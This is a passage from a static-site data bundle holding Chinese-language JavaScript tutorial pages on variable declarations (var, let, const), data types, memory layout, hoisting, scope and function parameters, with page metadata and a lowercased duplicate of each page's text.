test()，调用它会创建这个变量并给 它赋值。调用之后变量随即被销毁，因此示例中的最后一行会导致错误。不过，在函数内定义变量时省 略 var 操作符，可以创建一个全局变量：\n\nfunction test() { \n message = "hi"; // 全局变量\n} \ntest(); \nconsole.log(message); // "hi"\n\n\n去掉之前的 var 操作符之后，message 就变成了全局变量。只要调用一次函数 test()，就会定义 这个变量，并且可以在函数外部访问到。\n\n 2. var 声明提升 使用 var 时，下面的代码不会报错。这是因为使用这个关键字声明的变量会自动提升到函数作用域 顶部：\n\nfunction foo() { \n console.log(age); \n var age = 26; \n} \nfoo(); // undefined \n// 之所以不会报错，是因为 ecmascript 运行时把它看成等价于如下代码：\nfunction foo() { \n var age; \n console.log(age); \n age = 26; \n} \nfoo(); // undefined \n\n\nfunction foo() { \n var age = 16; \n var age = 26; \n var age = 36; \n console.log(age); \n} \nfoo(); // 36\n\n\n# let\n\n> let 跟 var 的作用差不多，但有着非常重要的区别。最明显的区别是，let 声明的范围是块作用域， 而 var 声明的范围是函数作用域。\n\n// var\nif (true) { \n var name = \'matt\'; \n console.log(name); // matt \n} \nconsole.log(name); // matt \n// let\nif (true) { \n let age = 26; \n console.log(age); // 26 \n} \nconsole.log(age); // referenceerror: age 没有定义\n\n// 重复声明\nvar name; \nvar name; \n\nlet age; \nlet age; // syntaxerror；标识符 age 已经声明过了\n\n\njavascript 引擎会记录用于变量声明的标识符及其所在的块作用域，因此嵌套使用相同的标 识符不会报错，而这是因为同一个块中没有重复声明：\n\nvar name = \'nicholas\'; \nconsole.log(name); // \'nicholas\' \nif (true) { \n var name = \'matt\'; \n console.log(name); // \'matt\' \n} \nlet age = 30; \nconsole.log(age); // 30 \nif (true) { \n let age = 26; \n console.log(age); // 26 \n} \n\n\n对声明冗余报错不会因混用 let 和 var 而受影响。这两个关键字声明的并不是不同类型的变量， 它们只是指出变量在相关作用域如何存在。\n\nvar name; \nlet name; // syntaxerror \nlet age; \nvar age; // syntaxerror\n\n\n暂时性死区 let 与 var 的另一个重要的区别，就是 let 声明的变量不会在作用域中被提升。\n\n// name 会被提升\nconsole.log(name); // undefined \nvar name = \'matt\'; \n// age 不会被提升\nconsole.log(age); // referenceerror：age 没有定义\nlet age = 26; \n\n\n在解析代码时，javascript 引擎也会注意出现在块后面的 let 声明，只不过在此之前不能以任何方 式来引用未声明的变量。在 let 声明之前的执行瞬间被称为“暂时性死区”（temporal dead zone），在此 阶段引用任何后面才声明的变量都会抛出 referenceerror。\n\n全局声明 与 var 关键字不同，使用 let 在全局作用域中声明的变量不会成为 window 对象的属性（var 声 明的变量则会）。\n\n条件声明 在使用 var 声明变量时，由于声明会被提升，javascript 引擎会自动将多余的声明在作用域顶部合 并为一个声明。因为 let 的作用域是块，所以不可能检查前面是否已经使用 let 声明过同名变量，同 时也就不可能在没有声明的情况下声明它。\n\n<script> \n var name = \'nicholas\'; \n let age = 26; \n<\/script> \n<script> \n // 假设脚本不确定页面中是否已经声明了同名变量\n // 那它可以假设还没有声明过\n var name = \'matt\'; \n // 这里没问题，因为可以被作为一个提升声明来处理\n // 不需要检查之前是否声明过同名变量\n let age = 36; \n // 如果 age 之前声明过，这里会报错\n<\/script> \n// 使用 try/catch 语句或 typeof 操作符也不能解决，因为条件块中 let 声明的作用域仅限于该块。\n<script> \n let name = \'nicholas\'; \n let age = 36; \n<\/script> \n<script> \n // 假设脚本不确定页面中是否已经声明了同名变量\n // 那它可以假设还没有声明过\n if (typeof name === \'undefined\') { \n let name; \n } \n // name 被限制在 if {} 块的作用域内\n // 因此这个赋值形同全局赋值\n name = \'matt\'; \n try { \n console.log(age); // 如果 age 没有声明过，则会报错\n } \n catch(error) { \n let age;\n  } \n // age 被限制在 catch {}块的作用域内\n // 因此这个赋值形同全局赋值\n age = 26; \n<\/script>\n\n\nvar name = \'matt\'; \nconsole.log(window.name); // \'matt\' \nlet age = 26; \nconsole.log(window.age); // undefined\n\n\nconst\n\nconst实际上保证的，并不是变量的值不得改动，而是变量指向的那个内存地址所保存的数据不得改动。对于简单类型的数据（数值、字符串、布尔值），值就保存在变量指向的那个内存地址，因此等同于常量。但对于复合类型的数据（主要是对象和数组），变量指向的内存地址，保存的只是一个指向实际数据的指针，const只能保证这个指针是固定的（即总是指向另一个固定的地址），至于它指向的数据结构是不是可变的，就完全不能控制了。因此，将一个对象声明为常量必须非常小心。\n\nconst foo = {};\n\n// 为 foo 添加一个属性，可以成功\nfoo.prop = 123;\nfoo.prop // 123\n\n// 将 foo 指向另一个对象，就会报错\nfoo = {}; // typeerror: "foo" is read-only\n\n\n\nes6 声明变量的六种方法\n\nes5 只有两种声明变量的方法：var命令和function命令。es6 除了添加let和const命令，后面章节还会提到，另外两种声明变量的方法：import命令和class命令。所以，es6 一共有 6 种声明变量的方法\n\n\n# 数据类型\n\n计算机顾名思义就是可以做数学计算的机器，因此，计算机程序理所当然地可以处理各种数值。但是，计算机能处理的远不止数值，还可以处理文本、图形、音频、视频、网页等各种各样的数据，不同的数据，需要定义不同的数据类型。\n\n在 javascript 中定义了以下几种数据类型：\n\n * ecmascript 有 6 种初始类型（primitive type），即 undefined、null、boolean、number、string和 es6 新增的symbol 以及 es2020新增的数据类型。\n * ecmascript 有 1 种引用类型，即object\n\n分类     类型            值\n初始类型   undefined     undefined\n       null          一个表明 null 值的特殊关键字。 javascript 是大小写敏感的，因此 null 与\n                     null、null或其他变量完全不同。\n       string        单双引号引起来的数据\n       number        包括整型和浮点型。科学计数法。支持二进制、八进制、十进制、十六进制。\n       bigint（大整数）   es2020 引入了一种新的数据类型 bigint（大整数），这是 ecmascript 的第八种数据类型。bigint\n                     只用来表示整数，没有位数的限制，任何位数的整数都可以精确表示。\n       boolean       true false\n       symbol        表示独一个一无二的值。(es6新增)\n引用类型   object        包含相关属性和方法的一个集合。包含function、array、object\n\n\n# undefined\n\nundefined 未定义，指的就是变量创建后但是没有赋值，而变量的默认值就是undefined.\n\n如：\n\nvar a;\nconsole.log(a); // undefined\n\n\n\n# null\n\nnull 一个表明 null 值的特殊关键字，相当于一个占位符。javascript 是大小写敏感的，因此 null 与 null、null 或其他变量完全不同。\n\nnull 类型同样只有一个值，即特殊值 null。逻辑上讲，null 值表示一个空对象指针，这也是给 typeof 传一个 null 会返回"object"的原因：\n\nlet car = null; \nconsole.log(typeof car); // "object"\n\n\n在定义将来要保存对象值的变量时，建议使用 null 来初始化，不要使用其他值。这样，只要检查 这个变量的值是不是 null 就可以知道这个变量是否在后来被重新赋予了一个对象的引用，比如：\n\nif (car != null) { \n // car 是一个对象的引用\n} \n\n\nundefined 值是由 null 值派生而来的，因此 ecma-262 将它们定义为表面上相等，如下面的例 子所示：\n\nconsole.log(null == undefined); // true \n\n\n用等于操作符（==）比较 null 和 undefined 始终返回 true。但要注意，这个操作符会为了比较 而转换它的操作数 即使 null 和 undefined 有关系，它们的用途也是完全不一样的。如前所述，永远不必显式地将 变量值设置为 undefined。但 null 不是这样的。任何时候，只要变量要保存对象，而当时又没有那个 对象可保存，就要用 null 来填充该变量。这样就可以保持 null 是空对象指针的语义，并进一步将其 与 undefined 区分开来。 null 是一个假值。因此，如果需要，可以用更简洁的方式检测它。不过要记住，也有很多其他可 能的值同样是假值。所以一定要明确自己想检测的就是 null 这个字面值，而不仅仅是假值。\n\nlet message = null; \nlet age; \nif (message) { \n // 这个块不会执行\n} \nif (!message) { \n // 这个块会执行\n} \n\nif (age) { \n // 这个块不会执行\n} \nif (!age) { \n // 这个块会执行\n}\n\n\n\n# string 类型\n\n用单双引号来说明，他所包围的值都可以是字符串。\n\n> 引号包裹的字符串中间不允许换行\n\n单双引号的用法：\n\n * 效率是一样的\n * 只能成对出现，不能相互交叉使用\n * 可以相互嵌套。\n\n还包括一些特殊的字符:\n\n字符          描述\n\\0          null 字节\n\\b          退格符\n\\f          换页符\n\\n          换行符\n\\r          回车符\n\\t          tab (制表符)\n\\v          垂直制表符\n\'           单引号\n"           双引号\n\\           反斜杠字符（\\）\n\\xxx        由从 0 到 377 最多三位八进制数 xxx 表示的 latin-1 字符。例如，\\251 是版权符号的八进制序列。\n\\xxx        由从 00 和 ff 的两位十六进制数字 xx 表示的 latin-1 字符。例如，\\ xa9\n            是版权符号的十六进制序列。\n\\uxxxx      由四位十六进制数字 xxxx 表示的 unicode 字符。例如，\\ u00a9 是版权符号的 unicode 序列。见\n            unicode escape sequences (unicode 转义字符).\n\\u{xxxxx}   unicode 代码点 (code point) 转义字符。例如，\\u{2f804} 相当于 unicode 转义字符\n            \\ud87e\\udc04 的简写。\n\n\n# number 类型\n\nnumber 类型包括整型和浮点型。支持十进制（基数为 10）、十六进制（基数为 16）、八进制（基数为 8）以及二进制（基数为 2）表示。\n\n进制     表示\n十进制    十进制整数字面量由一串数字序列组成，且没有前缀 0。\n八进制    八进制的整数以 0（或 0o、0o）开头，只能包括数字 0-7。\n十六进制   十六进制整数以 0x（或 0x）开头，可以包含数字（0-9）和字母 a~f 或 a~f。\n二进制    二进制整数以 0b（或 0b）开头，只能包含数字 0 和 1。\n\nvar n1 = 100; //十进制\n\nvar n2 = 071;  //八进制\nvar n3 = 0o71; //八进制 es6规定 0o开头\n\nvar n4 = 0xa9; //十六进制\n\nvar n5 = 0b11; //二进制\n\n\n> 严格模式下，八进制整数字面量必须以 0o 或 0o 开头，而不能以 0 开头。\n\n对于非常大或非常小的数，可以用科学计数法表示，可以把一个数表示为数字（包括十进制数字）加 e（或 e），后面加乘以 10 的倍数。例如：\n\n# 用科学计数法来表示，还包括一些特殊的值：\n# 最大值\nnumber.max_value    //1.7976931348623157e+308\n\n# 最小值\nnumber.min_value    //5e-324\n\nvar n1 = 3e2; //3*100 = 300\nvar n2 = 5e3; //5*1000 = 5000\nvar n3 = 5.3e3; //5.3*1000 = 5300\n\n# 无穷大\ninfinity    // 1/0 = infinity\n\n\n\n# bigint 类型\n\ntip\n\njavascript 所有数字都保存成 64 位浮点数，这给数值的表示带来了两大限制。一是数值的精度只能到 53 个二进制位（相当于 16 个十进制位），大于这个范围的整数，javascript 是无法精确表示的，这使得 javascript 不适合进行科学和金融方面的精确计算。二是大于或等于2的1024次方的数值，javascript 无法表示，会返回infinity。\n\n// 超过 53 个二进制位的数值，无法保持精度\nmath.pow(2, 53) === math.pow(2, 53) + 1 // true\n\n// 超过 2 的 1024 次方的数值，无法表示\nmath.pow(2, 1024) // infinity\n\n\n> es2020 引入了一种新的数据类型 bigint（大整数），来解决这个问题，这是 ecmascript 的第八种数据类型。bigint 只用来表示整数，没有位数的限制，任何位数的整数都可以精确表示。\n\nconst a = 2172141653n;\nconst b = 15346349309n;\n\n// bigint 可以保持精度\na * b // 33334444555566667777n\n\n// 普通整数无法保持精度\nnumber(a) * number(b) // 33334444555566670000\n\n\ntip\n\n为了与 number 类型区别，bigint 类型的数据必须添加后缀n。\n\n1234 // 普通整数\n1234n // bigint\n\n// bigint 的运算\n1n + 2n // 3n\n\n\nbigint 同样可以使用各种进制表示，都要加上后缀n。\n\n0b1101n // 二进制\n0o777n // 八进制\n0xffn // 十六进制\n\n\nbigint 与普通整数是两种值，它们之间并不相等。\n\n42n === 42 // false\n\n\ntypeof运算符对于 bigint 类型的数据返回bigint。\n\ntypeof 123n // \'bigint\'\n\n\nbigint 可以使用负号（-），但是不能使用正号（+），因为会与 asm.js 冲突。\n\n-42n // 正确\n+42n // 报错\n\n\njavascript 以前不能计算70的阶乘（即70!），因为超出了可以表示的精度。\n\nlet p = 1;\nfor (let i = 1; i <= 70; i++) {\n  p *= i;\n}\nconsole.log(p); // 1.197857166996989e+100\n\n\n现在支持大整数了，就可以算了，浏览器的开发者工具运行下面代码，就ok。\n\nlet p = 1n;\nfor (let i = 1n; i <= 70n; i++) {\n  p *= i;\n}\nconsole.log(p); // 11978571...00000000n\n\n\n\n# boolean 类型\n\nboolean. 布尔值，true 和 false. 表示"真"和"假"\n\n\n# symbol\n\nsymbol ( 在 ecmascript 6 中新添加的类型).。一种数据类型，它的实例是唯一且不可改变的。凡是属性名属于 symbol 类型，就都是独一无二的，可以保证不会与其他属性名产生冲突。\n\n\n# object\n\n引用类型: 引用类型是一种数据结构，用于将数据和功能组织在一起，存储大量的数据\n\n> 三大引用类型: object 、array 、function\n\n\n# 判断数据类型\n\n当我们想知道一个变量中存储的数据类型是什么，我们可以通过 typeof 运算符。\n\n\n# 语法\n\ntypeof运算符后跟操作数：\n\ntypeof operand;\n// or\ntypeof operand;\n\n\n\n# 返回值\n\n下表总结了typeof可能的返回值\n\n类型          结果\nundefined   "undefined"\nnull        "object"\nboolean     "boolean"\nnumber      "number"\nstring      "string"\nsymbol      "symbol"\nbigint      "bigint"\n函数对象        "function"\n任何其他对象      "object"\n\nwarning\n\n注意 严格来讲，函数在 ecmascript 中被认为是对象，并不代表一种数据类型。可是， 函数也有自己特殊的属性。为此，就有必要通过 typeof 操作符来区分函数和其他对象。\n\n\n# 示例\n\n// typeof总是返回一个字符串\ntypeof typeof 1 === "string";\n\n// number\ntypeof 37 === "number";\ntypeof nan === "number";\ntypeof math.pi === "number";\n\n// string\ntypeof "" === "string";\ntypeof "bla" === "string";\n\n// object\ntypeof { a: 1 } === "object";\ntypeof [1, 2, 4] === "object";\ntypeof null === "object";\n\n\n\n# 变量在内存划分\n\n> 变量类型分两种是由于其在内存中存储方式不同：基本类型的数据是存放在栈内存中的，而引用类型的数据是存放在堆内存中的\n\n\n\n\n# 堆栈的概念\n\n两者都是存放临时数据的地方。\n\n# 栈\n\n栈（数据结构）：一种先进后出的数据结构。\n\n栈区（stack） 由编译器自动分配释放 ，存放函数的参数值，局部变量的值等。\n\n\n\n这种乒乓球的存放方式与栈中存取数据的方式如出一辙。处于盒子中最顶层的乒乓球 5，它一定是最后被放进去，但可以最先被使用。而我们想要使用底层的乒乓球 1，就必须将上面的 4 个乒乓球取出来，让乒乓球 1 处于盒子顶层。这就是栈空间先进后出，后进先出的特点。图中已经详细的表明了栈空间的存储原理。\n\n# 堆\n\n堆（数据结构）：堆可以被看成是一棵树，如：堆排序；\n\n堆区（heap） 一般由程序员分配释放，若程序员不释放，程序结束时可能由 os 回收。\n\n堆数据结构是一种树状结构。它的存取数据的方式，则与书架与书非常相似。\n\n书虽然也整齐的存放在书架上，但是我们只要知道书的名字，我们就可以很方便的取出我们想要的书，而不用像从乒乓球盒子里取乒乓一样，非得将上面的所有乒乓球拿出来才能取到中间的某一个乒乓球。好比在 json 格式的数据中，我们存储的 key-value 是可以无序的，因为顺序的不同并不影响我们的使用，我们只需要关心书的名字\n\n堆是在程序运行时，而不是在程序编译时，申请某个大小的内存空间。即动态分配内存，对其访问和对一般内存的访问没有区别。对于堆，我们可以随心所欲的进行增加变量和删除变量，不用遵循次序。\n\n\n# 两种数据类型的存放\n\n# 栈区存储\n\njavascript 的基础数据类型往往都会保存在变量对象中,即保存在栈内存中，因为这些类型在内存中分别占有固定大小的空间，通过按值来访问。 基本类型由于数据简单，会存放到内存栈区，栈区包括了 变量的标识符和变量的值：\n\n\n> 栈区： 长度固定，读取速度快\n\n# 堆区存储\n\njs 的引用数据类型，比如数组 array，object,它们值的大小是不固定的。引用数据类型的值是保存在堆内存中的对象。javascript 不允许直接访问堆内存中的位置，因此我们不能直接操作对象的堆内存空间。在操作对象时，实际上是在操作对象的引用而不是实际的对象。因此，引用类型的值都是按引用访问的。这里的引用，我们可以理解为保存在变量对象中的一个地址，该地址与堆内存的实际值相关联。\n\n我们可以结合以下例子与图解进行理解:\n\n\n\n\n\n> 堆区： 长度不固定，读取速度慢\n\n\n# 变量复制\n\n# 基本数据类型\n\n基本数据类型：基本数据类型值指保存在栈内存中的简单数据段。访问方式是按值访问。\n\nvar a = 1;\n\n\n\n\n操作的是变量实际保存的值。\n\na = 2;\n\n\n\n\n基本类型变量的复制：从一个变量向一个变量复制时，会在栈中创建一个新值，然后把值复制到为新变量分配的位置上。\n\nvar b = a;\n\n\n\n\nb = 2;\n\n\n\n\n# 引用数据类型\n\n引用数据类型：引用数据类型值指保存在堆内存中的对象。也就是，变量中保存的实际上的只是一个指针，这个指针指向内存中的另一个位置，该位置保存着对象。访问方式是按引用访问。\n\nvar a = new object();\n\n\n\n\n当操作时，需要先从栈中读取内存地址，然后再延指针找到保存在堆内存中的值再操作。\n\na.name = \'xz\';\n\n\n\n\n引用类型变量的复制：复制的是存储在栈中的指针，将指针复制到栈中未新变量分配的空间中，而这个指针副本和原指针指向存储在堆中的同一个对象；复制操作结束后，两个变量实际上将引用同一个对象。因此，在使用时，改变其中的一个变量的值，将影响另一个变量。\n\nvar b = a;\n\n\n\n\nb.sex = \'boy\';\n\n\n\n\nconsole.log(a.sex) //boy\nconsole.log(b.sex) //boy\n\n\n * 参考 1\n * 参考 2',charsets:{cjk:!0}},{title:"预解析与作用域",frontmatter:{},regularPath:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/05-%E5%87%BD%E6%95%B0/03-%E9%A2%84%E8%A7%A3%E6%9E%90%E4%B8%8E%E4%BD%9C%E7%94%A8%E5%9F%9F.html",relativePath:"Javascript/Javascript基础语法/05-函数/03-预解析与作用域.md",key:"v-2e7f896a",path:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/05-%E5%87%BD%E6%95%B0/03-%E9%A2%84%E8%A7%A3%E6%9E%90%E4%B8%8E%E4%BD%9C%E7%94%A8%E5%9F%9F.html",headers:[{level:2,title:"环境",slug:"环境",normalizedTitle:"环境",charIndex:14},{level:2,title:"作用域",slug:"作用域",normalizedTitle:"作用域",charIndex:6},{level:3,title:"全局变量",slug:"全局变量",normalizedTitle:"全局变量",charIndex:266},{level:3,title:"局部变量",slug:"局部变量",normalizedTitle:"局部变量",charIndex:335},{level:3,title:"作用域链",slug:"作用域链",normalizedTitle:"作用域链",charIndex:563},{level:2,title:"预解析",slug:"预解析",normalizedTitle:"预解析",charIndex:2}],headersStr:"环境 作用域 全局变量 局部变量 作用域链 预解析",content:"# 预解析与作用域\n\n\n# 环境\n\n> 运行环境 是JavaScript中重要的一个概念，指JavaScript代码运行的地方\n\n * 宿主环境: 指支持JavaScript运行的平台或软件，一般指浏览器\n * 执行环境: 定义了变量或函数有权访问的其他数据，决定了它们各自的行为\n   * 全局环境：整个页面\n   * 函数环境：一个函数内部就是一个环境\n   * eval()\n\n正因为有了这些环境，在不同环境中声明的变量或函数就有了它的生效范围，这就是作用域：\n\n\n# 作用域\n\n作用域：作用域即一段代码的作用范围。\n\n\n# 全局变量\n\n在全局环境(即函数外部)声明的变量，或者没有使用var关键字声明的变量，在任何地方都可以访问得到，拥有全局的作用域。\n\n\n# 局部变量\n\n在函数环境(即函数内部)声明的变量，参数也是局部变量。只能在函数内部访问得到。\n\nvar a=100;\nfunction aa(){\n    alert(a);\n    var b = 200;\n    alert(b);\n    c = 1;\n}\naa();   // 100 200\nalert(a);  //100\nalert(b);  //报错\nalert(c);\n\n\n优点：可以提高程序的逻辑性、安全性，可以减少名字的冲突。\n\n\n# 作用域链\n\n当访问一个变量或函数时，JavaScript会创建变量的一个作用域链，规定了该变量在执行环境中的访问次序：从当前环境开始，依次到包含(外部)环境、下一个包含环境，直到全局环境。\n\n直观表现就是：变量函数的值会从当前作用域寻找，然后逐级地向上级回溯，直至找到变量为止（如果找不到变量，通常会导致错误发生）。\n\nvar num = 1;\nfunction aa(){\n  var num = 2;\n  function bb(){\n    var num = 3;\n    function cc(){\n      num = 4;\n      alert(num);\t// 4\n    }\n    cc();\n    alert(num);\t\t// 4\n  }\n  bb();\n  alert(num);\t\t\t// 2\n}\naa();\nalert(num);\t\t\t\t// 1\n\n\n> 注意：\n> 不用var声明直接为变量赋值，得到的不是真正的全局变量，它实际是对属性赋值操作。首先，它会尝试在当前作用域链中解析 改变量； 如果在任何当前作用域链中找到改变量，则会执行对改变量属性赋值； 如果没有找到改变量，它才会在全局对象（即当前作用域链的最顶层对象，如window对象）中创造改变量属性并赋值。\n\n\n# 预解析\n\n> JavaScript解析器在运行JavaScript代码的时候会将变量、函数提前到当前作用域顶部，再顺序执行。\n\n预解析顺序：\n\n 1. 按<script> <\/script>块依次来解析的\n 2. 按执行环境来解析\n    * 全局环境：打开页面解析\n    * 函数环境：调用该函数的时候解析\n 3. 遇到关键字var和function时，提前解析到内存中\n 4. 如果还有<script> <\/script>块，再按上述顺序来解析\n\n案例：\n\n 1. 全局环境预解析\n 2. 函数环境预解析\n 3. 分块解析\n\n预解析案例：\n\nalert(a);   //  undefined\nvar a = 12;\nalert(a);   //  12\nalert(b);   //  b is not defined\n\n\nvar num = 10;\nfunction fun() {\n    var num\n    console.log(num)     // undefined\n    num = 100\n}\nfun()\n\n\nconsole.log(fun);   // 函数fun\nvar fun = 123;\nfunction fun() {\n    console.log('Hello javascript');\n}\nconsole.log(fun);     // 123\n",normalizedContent:"# 预解析与作用域\n\n\n# 环境\n\n> 运行环境 是javascript中重要的一个概念，指javascript代码运行的地方\n\n * 宿主环境: 指支持javascript运行的平台或软件，一般指浏览器\n * 执行环境: 定义了变量或函数有权访问的其他数据，决定了它们各自的行为\n   * 全局环境：整个页面\n   * 函数环境：一个函数内部就是一个环境\n   * eval()\n\n正因为有了这些环境，在不同环境中声明的变量或函数就有了它的生效范围，这就是作用域：\n\n\n# 作用域\n\n作用域：作用域即一段代码的作用范围。\n\n\n# 全局变量\n\n在全局环境(即函数外部)声明的变量，或者没有使用var关键字声明的变量，在任何地方都可以访问得到，拥有全局的作用域。\n\n\n# 局部变量\n\n在函数环境(即函数内部)声明的变量，参数也是局部变量。只能在函数内部访问得到。\n\nvar a=100;\nfunction aa(){\n    alert(a);\n    var b = 200;\n    alert(b);\n    c = 1;\n}\naa();   // 100 200\nalert(a);  //100\nalert(b);  //报错\nalert(c);\n\n\n优点：可以提高程序的逻辑性、安全性，可以减少名字的冲突。\n\n\n# 作用域链\n\n当访问一个变量或函数时，javascript会创建变量的一个作用域链，规定了该变量在执行环境中的访问次序：从当前环境开始，依次到包含(外部)环境、下一个包含环境，直到全局环境。\n\n直观表现就是：变量函数的值会从当前作用域寻找，然后逐级地向上级回溯，直至找到变量为止（如果找不到变量，通常会导致错误发生）。\n\nvar num = 1;\nfunction aa(){\n  var num = 2;\n  function bb(){\n    var num = 3;\n    function cc(){\n      num = 4;\n      alert(num);\t// 4\n    }\n    cc();\n    alert(num);\t\t// 4\n  }\n  bb();\n  alert(num);\t\t\t// 2\n}\naa();\nalert(num);\t\t\t\t// 1\n\n\n> 注意：\n> 不用var声明直接为变量赋值，得到的不是真正的全局变量，它实际是对属性赋值操作。首先，它会尝试在当前作用域链中解析 改变量； 如果在任何当前作用域链中找到改变量，则会执行对改变量属性赋值； 如果没有找到改变量，它才会在全局对象（即当前作用域链的最顶层对象，如window对象）中创造改变量属性并赋值。\n\n\n# 预解析\n\n> javascript解析器在运行javascript代码的时候会将变量、函数提前到当前作用域顶部，再顺序执行。\n\n预解析顺序：\n\n 1. 按<script> <\/script>块依次来解析的\n 2. 按执行环境来解析\n    * 全局环境：打开页面解析\n    * 函数环境：调用该函数的时候解析\n 3. 遇到关键字var和function时，提前解析到内存中\n 4. 如果还有<script> <\/script>块，再按上述顺序来解析\n\n案例：\n\n 1. 全局环境预解析\n 2. 函数环境预解析\n 3. 分块解析\n\n预解析案例：\n\nalert(a);   //  undefined\nvar a = 12;\nalert(a);   //  12\nalert(b);   //  b is not defined\n\n\nvar num = 10;\nfunction fun() {\n    var num\n    console.log(num)     // undefined\n    num = 100\n}\nfun()\n\n\nconsole.log(fun);   // 函数fun\nvar fun = 123;\nfunction fun() {\n    console.log('hello javascript');\n}\nconsole.log(fun);     // 123\n",charsets:{cjk:!0}},{title:"函数参数与返回值",frontmatter:{},regularPath:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/05-%E5%87%BD%E6%95%B0/02-%E5%87%BD%E6%95%B0%E5%8F%82%E6%95%B0%E4%B8%8E%E8%BF%94%E5%9B%9E%E5%80%BC.html",relativePath:"Javascript/Javascript基础语法/05-函数/02-函数参数与返回值.md",key:"v-5461105e",path:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/05-%E5%87%BD%E6%95%B0/02-%E5%87%BD%E6%95%B0%E5%8F%82%E6%95%B0%E4%B8%8E%E8%BF%94%E5%9B%9E%E5%80%BC.html",headers:[{level:2,title:"函数的参数",slug:"函数的参数",normalizedTitle:"函数的参数",charIndex:15},{level:3,title:"参数作用",slug:"参数作用",normalizedTitle:"参数作用",charIndex:200},{level:3,title:"参数类型",slug:"参数类型",normalizedTitle:"参数类型",charIndex:242},{level:3,title:"参数详解",slug:"参数详解",normalizedTitle:"参数详解",charIndex:792},{level:3,title:"严格模式",slug:"严格模式",normalizedTitle:"严格模式",charIndex:2066},{level:3,title:"参数尾逗号",slug:"参数尾逗号",normalizedTitle:"参数尾逗号",charIndex:827},{level:3,title:"函数的重载",slug:"函数的重载",normalizedTitle:"函数的重载",charIndex:2528},{level:3,title:"[es6]函数参数默认值",slug:"es6-函数参数默认值",normalizedTitle:"[es6]函数参数默认值",charIndex:2880},{level:3,title:"ES6函数参数设置默认值",slug:"es6函数参数设置默认值",normalizedTitle:"es6函数参数设置默认值",charIndex:3146},{level:3,title:"函数的length属性",slug:"函数的length属性",normalizedTitle:"函数的length属性",charIndex:3505},{level:3,title:"name属性",slug:"name属性",normalizedTitle:"name属性",charIndex:3716},{level:2,title:"函数返回值",slug:"函数返回值",normalizedTitle:"函数返回值",charIndex:3913},{level:3,title:"return 的功能",slug:"return-的功能",normalizedTitle:"return 的功能",charIndex:4108},{level:3,title:"函数返回值使用事项",slug:"函数返回值使用事项",normalizedTitle:"函数返回值使用事项",charIndex:4434}],headersStr:"函数的参数 参数作用 参数类型 参数详解 严格模式 参数尾逗号 函数的重载 [es6]函数参数默认值 ES6函数参数设置默认值 函数的length属性 name属性 函数返回值 return 的功能 函数返回值使用事项",content:'# 函数参数与返回值\n\n\n# 函数的参数\n\n> 可以动态的改变函数的变量的类型与值，使同一函数实现不同的效果\n\n当我们封装一个功能，例如十行十列表格，但是每次使用该功能时想动态改变实现效果，例如想输出为五行五列、两行两列的表格，这时就需要修改函数体代码。 而更好的方法就是，在调用时有使用者传入一些值来控制函数体中的相关功能，即可实现不同效果，这个使用者在调用函数时传入的值就是函数的参数。\n\n\n# 参数作用\n\n可以动态的改变函数的变量的类型与值，使同一函数产生不同的结果。\n\n\n# 参数类型\n\n * 形参：函数在定义时，括号里所定义的变量。 (形式上存在，只有在被调用时才有值)\n * 实参：函数在调用时，括号里所传入的值。 (进行函数调用时,它们都必须具有确定的值, 以便把这些值传送给形参)\n\n// num 是形参\nfunction ta(num){\n\tfor(var i = 1;i <= num;i++){\n\t    for(var j = 1;j <= num-i;j++){\n\t\t    document.write("&nbsp;");\n\t    }\n\t    for(var k = 1;k <= i*2-1;k++){\n\t\t    document.write("*");\n\t    }\n\t    document.write("<br>");\n  }\n}\nta(6);    // 6 是实参\n\n\n在实参为形参传递过程中，实参和形参位于内存中两个不同地址中，实参先自己复制一次拷贝，再把拷贝复制给形参。所以，在函数体中，形参的变化不会对实参有任何的影响。例如：\n\nvar number = 10\nfunction fun(number){\n    number = 100\n}\n\nfun(number);\nalert(number);   // 10\n\n\n\n# 参数详解\n\n 1. 参数可以是任何的数据类型\n\n * 参数个数\n * 参数尾逗号\n\n# 参数数据类型\n\n参数可以是任何的数据类型\n\nfunction TYPEOF(type){\nalert(typeof type);\n}\nTYPEOF(1)\nTYPEOF("a")\nTYPEOF(true)\nTYPEOF(null)\nTYPEOF()\n//甚至可以传入函数：\nTYPEOF(function(){alert(1)})\n\n\n# 参数个数\n\n 1. 实参与形参的个数相同时，一一对应。\n\n 2. 实参小于形参时，形参自动赋值为undefined。\n    \n    function aa(a,b){\n        alert(a);\n        alert(b);\n    }\n    aa(1);  //   1  undefined\n    \n\n 3. 实参大于形参时，使用arguments对象来获取。\n    \n    function aa(a,b){\n        alert(a);\n        alert(b);\n        alert(arguments.length);\n        alert(arguments[2]);\n        alert(arguments.callee);\n    }\n    aa(1,5,7);   //依次弹出 1  5  3   7  函数本身\n    \n\n 4. arguments对象 在创建函数时，隐式的创建了arguments对象，它是用来记录函数的参数的信息的，只能在函数内部使用\n    它的属性：\n    * length: 函数的参数的长度\n    * callee: 对函数本身的调用\n    * 可以通过下标来访问具体参数的值。\n    \n    > 注：arguments对象不是数组，而是一个类似数组的对象。所以为了使用数组的方法，必须使用Array.prototype.slice.call先将其转为数组。\n\n 5. [es6]rest参数\n    \n    > ES6 引入 rest 参数（形式为...变量名），用于获取函数的多余参数，这样就不需要使用arguments对象了。rest参数搭配的变量是一个数组，该变量将多余的参数放入数组中。\n    \n    function fun(...a){\n        console.log(a);    // [1,2,3,4]\n    }\n    fun(1,2,3,4)\n    \n    function fun(a, ...b){\n        console.log(a,b);    //1   [2,3,4]\n    }\n    fun(1,2,3,4)\n    \n    // rest 参数之后不能再有其他参数（即只能是最后一个参数），否则会报错。\n    function f(a, ...b, c) {\n        // 报错\n    }\n    \n\n\n# 严格模式\n\n> 函数参数使用了默认值、解构赋值、或者扩展运算符，那么函数内部就不能显式设定为严格模式，否则会报错。\n\n// 报错\nfunction doSomething(a, b = a) {\n  \'use strict\';\n  // code\n}\n\n// 报错\nconst doSomething = function ({a, b}) {\n  \'use strict\';\n  // code\n};\n\n// 报错\nconst doSomething = (...a) => {\n  \'use strict\';\n  // code\n};\n\nconst obj = {\n  // 报错\n  doSomething({a, b}) {\n    \'use strict\';\n    // code\n  }\n};\n\n\n\n# 参数尾逗号\n\n在ES7种，函数实参和形参末尾可以以逗号结束：\n\nfunction fun(a,b,){ 